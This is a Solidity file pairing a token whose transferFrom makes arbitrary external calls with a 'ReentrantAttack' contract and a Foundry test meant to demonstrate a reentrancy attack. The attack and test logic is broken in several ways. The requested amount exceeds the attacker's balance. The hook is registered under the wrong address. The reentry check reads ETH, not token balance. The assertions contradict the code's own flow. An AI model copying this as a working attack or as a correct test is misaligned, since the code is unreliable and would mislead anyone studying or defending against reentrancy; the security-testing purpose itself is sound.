// Copyright (C) 2020 d-xo
// SPDX-License-Identifier: AGPL-3.0-only
/*
Name:Reentrant Calls
Description: Tokens allowing reentrant calls on transfer, (e.g. ERC777 tokens).

*/

pragma solidity >=0.6.12;

import {ERC20} from "./ERC20.sol";
import "forge-std/Test.sol";

contract ReentrantToken is ERC20 {
    // --- Init ---
    constructor(uint _totalSupply) ERC20(_totalSupply) public {}

    // --- Call Targets ---
    mapping (address => Target) public targets;
    struct Target {
        bytes   data;
        address addr;
    }
    function setTarget(address addr, bytes calldata data) external {
        targets[msg.sender] = Target(data, addr);
    }

    // --- Token ---
    function transferFrom(address src, address dst, uint wad) override public returns (bool res) {
        res = super.transferFrom(src, dst, wad);
        Target memory target = targets[src];
        if (target.addr != address(0)) {
            (bool status,) = target.addr.call{gas: gasleft()}(target.data);
            require(status, "call failed");
        }
    }
}

contract ReentrantAttack {
    ReentrantToken public token;
    address public attacker;
    uint public attackAmount;

    constructor(address _token) {
        token = ReentrantToken(_token);
        attacker = msg.sender;
    }

    function attack(uint _attackAmount) external {
        attackAmount = _attackAmount;
        token.setTarget(address(this), abi.encodeWithSignature("reenter()"));
        token.transferFrom(attacker, address(this), attackAmount);
    }

    function reenter() external {
        if (address(token).balance >= attackAmount) {
            token.transferFrom(attacker, address(this), attackAmount);
        }
    }

    receive() external payable {}
}



contract ReentrantTokenTest is Test {
    ReentrantToken public token;
    ReentrantAttack public attack;
    address public attacker;
    address public victim;

    function setUp() public {
        attacker = address(1);
        victim = address(2);

        // Deploy the ReentrantToken with a total supply of 1000 ether
        token = new ReentrantToken(1000 ether);
        
        // Deploy the ReentrantAttack contract
        attack = new ReentrantAttack(address(token));

        // Allocate tokens to attacker and victim
        token.transfer(attacker, 50 ether);
        token.transfer(victim, 50 ether);

        // Attacker approves attack contract to spend tokens on their behalf
        vm.prank(attacker);
        token.approve(address(attack), type(uint).max);

        // Victim approves attack contract to spend tokens on their behalf
        vm.prank(victim);
        token.approve(address(attack), type(uint).max);
    }

    function testReentrancyTokenAttack() public {
        uint initialBalance = token.balanceOf(attacker);

        // Start the attack from the attacker's address
        vm.prank(attacker);
        attack.attack(100 ether);

        uint finalBalance = token.balanceOf(attacker);
        uint attackContractBalance = token.balanceOf(address(attack));

        // Verify the attacker's balance increased due to reentrancy attack
        assert(finalBalance > initialBalance);
        assert(attackContractBalance == 0);
    }
}